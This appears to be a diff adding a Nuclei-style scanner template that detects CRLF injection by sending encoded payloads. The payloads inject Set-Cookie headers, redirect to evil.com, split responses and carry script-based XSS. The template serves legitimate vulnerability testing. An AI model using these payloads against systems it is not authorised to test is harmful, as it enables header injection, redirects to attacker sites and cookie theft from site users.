@@ -1,0 +1,67 @@
+id: CRLFInjection
+info:
+  name: CRLF Injection Detection
+  author: coffin
+  severity: High
+  description: Detects various CRLF injection vectors that can be exploited for attacks such as header injection, response splitting, and XSS.
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+  tags: crlf, crlf-ext, header-injection, response-splitting, xss
+  metadata:
+    max-request: 5
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%%0a0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%0aSet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%0d%0aLocation: http://evil.com"
+      - "{{BaseURL}}/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23"
+      - "{{BaseURL}}/%0d%0a%0d%0a<script>alert('XSS')</script>;"
+      - "{{BaseURL}}/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e"
+      - "{{BaseURL}}/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>"
+      - "{{BaseURL}}/%0d%0aHost: {{Hostname}}%0d%0aCookie: coffin=hi%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: coffin=hi%0d%0a%0d%0a"
+      - "{{BaseURL}}/%0d%0aLocation: www.evil.com"
+      - "{{BaseURL}}/%0d%0aSet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>"
+      - "{{BaseURL}}/%23%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%25%30%61Set-Cookie:coffin=hi"
+      - "{{BaseURL}}/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr"
+      - "{{BaseURL}}/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>"
+      - "{{BaseURL}}/%5Cr%20Set-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:coffin%5Cr%5CtSet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DLocation:www.evil.com"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ALocation:www.evil.com"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:coffinxp=coffinxp"
+      - "{{BaseURL}}/%u000ASet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/www.evil.com/%2E%2E%2F%0D%0Acoffin-x:coffin-x"
+      - "{{BaseURL}}/www.evil.com/%2F..%0D%0Acoffin-x:coffin-x"
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - '(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)www\.evil\.com\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?coffin=hi(?:\s*?)(?:$|;)))'
+          - '(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)www\.evil\.com\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?coffin=hi(?:\s*?)(?:$|;)|coffin-x))'
+        part: header
+      - type: status
+        status:
+          - 200
+          - 201
+          - 202
+          - 204
+          - 205
+          - 206
+          - 207
+          - 301
+          - 302
+          - 307
+          - 308
+        condition: or
